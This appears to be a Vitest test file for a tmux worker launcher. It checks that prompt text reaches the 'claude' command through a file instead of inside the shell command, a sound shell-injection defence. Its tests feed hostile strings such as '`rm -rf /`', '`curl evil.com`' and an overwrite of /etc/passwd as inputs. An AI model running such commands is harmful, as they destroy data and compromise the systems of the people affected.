import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  spawnWorker,
  cleanupPromptFile,
} from '../../src/orchestra/tmux.js';

vi.mock('node:child_process', () => ({
  spawnSync: vi.fn(),
}));

vi.mock('node:fs', () => ({
  writeFileSync: vi.fn(),
  unlinkSync: vi.fn(),
  mkdirSync: vi.fn(),
  existsSync: vi.fn(() => true),
}));

vi.mock('node:crypto', () => ({
  randomBytes: vi.fn(() => ({ toString: () => 'deadbeef12345678' })),
}));

import { spawnSync } from 'node:child_process';
import { writeFileSync, unlinkSync, existsSync } from 'node:fs';

const mockedSpawnSync = vi.mocked(spawnSync);
const mockedWriteFileSync = vi.mocked(writeFileSync);
const mockedUnlinkSync = vi.mocked(unlinkSync);
const mockedExistsSync = vi.mocked(existsSync);

beforeEach(() => {
  vi.clearAllMocks();
  mockedExistsSync.mockReturnValue(true);
  mockedSpawnSync.mockReturnValue({
    status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
  } as never);
});

describe('shell injection prevention', () => {
  it('prompt content is never embedded in the tmux command string', () => {
    const prompt = 'This is a normal prompt with some text';
    spawnWorker('task-001', 'sonnet', prompt, '/project');

    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('claude'));
    expect(cmdArg).toBeDefined();
    // The prompt text should NOT appear in the command
    expect(cmdArg).not.toContain('This is a normal prompt');
    // Instead it should use stdin redirect from a file. Sprint 170 P0-3
    // made the prompt filename taskId-aware: .prompt-{taskId}-{randomId}.txt
    expect(cmdArg).toContain('< /project/.tasks/.prompt-task-001-deadbeef12345678.txt');
  });

  it('$() subshell syntax in prompt does not appear in command args', () => {
    spawnWorker('task-002', 'opus', '$(whoami)', '/project');

    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('claude'));
    expect(cmdArg).not.toContain('$(whoami)');
  });

  it('backtick command substitution in prompt does not appear in command args', () => {
    spawnWorker('task-003', 'opus', '`rm -rf /`', '/project');

    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('claude'));
    expect(cmdArg).not.toContain('`rm -rf /`');
    expect(cmdArg).not.toContain('rm -rf');
  });

  it('${} variable expansion in prompt does not appear in command args', () => {
    spawnWorker('task-004', 'sonnet', '${HOME}; ${PATH}; ${SECRET}', '/project');

    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('claude'));
    expect(cmdArg).not.toContain('${HOME}');
    expect(cmdArg).not.toContain('${PATH}');
    expect(cmdArg).not.toContain('${SECRET}');
  });

  it('combined dangerous metacharacters do not leak into command', () => {
    const dangerous = "$(rm -rf /); `curl evil.com`; ${PATH}; echo 'pwned' > /etc/passwd";
    spawnWorker('task-005', 'haiku', dangerous, '/project');

    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('claude'));
    expect(cmdArg).not.toContain('rm -rf');
    expect(cmdArg).not.toContain('curl evil.com');
    expect(cmdArg).not.toContain('${PATH}');
    expect(cmdArg).not.toContain('/etc/passwd');
  });

  it('writePromptFile creates a file with the correct prompt content', () => {
    const prompt = 'Build the dashboard feature';
    spawnWorker('task-006', 'sonnet', prompt, '/project');

    // writeFileSync should be called with the prompt content written to the temp file
    const writeCall = mockedWriteFileSync.mock.calls.find(
      (c) => String(c[0]).includes('.prompt-'),
    );
    expect(writeCall).toBeDefined();
    expect(writeCall![1]).toBe(prompt);
    expect(writeCall![2]).toBe('utf-8');
  });

  it('prompt file path includes unique random id', () => {
    spawnWorker('task-007', 'sonnet', 'test prompt', '/project');

    const writeCall = mockedWriteFileSync.mock.calls.find(
      (c) => String(c[0]).includes('.prompt-'),
    );
    expect(writeCall).toBeDefined();
    // Sprint 170 P0-3: prompt filename now includes taskId prefix.
    expect(String(writeCall![0])).toContain('.prompt-task-007-deadbeef12345678.txt');
  });
});

describe('cleanupPromptFile', () => {
  it('deletes the prompt file at given path', () => {
    cleanupPromptFile('/project/.tasks/.prompt-abc123.txt');

    expect(mockedUnlinkSync).toHaveBeenCalledWith('/project/.tasks/.prompt-abc123.txt');
  });

  it('does not throw when file does not exist', () => {
    mockedUnlinkSync.mockImplementation(() => { throw new Error('ENOENT'); });

    expect(() => cleanupPromptFile('/nonexistent/path.txt')).not.toThrow();
  });
});
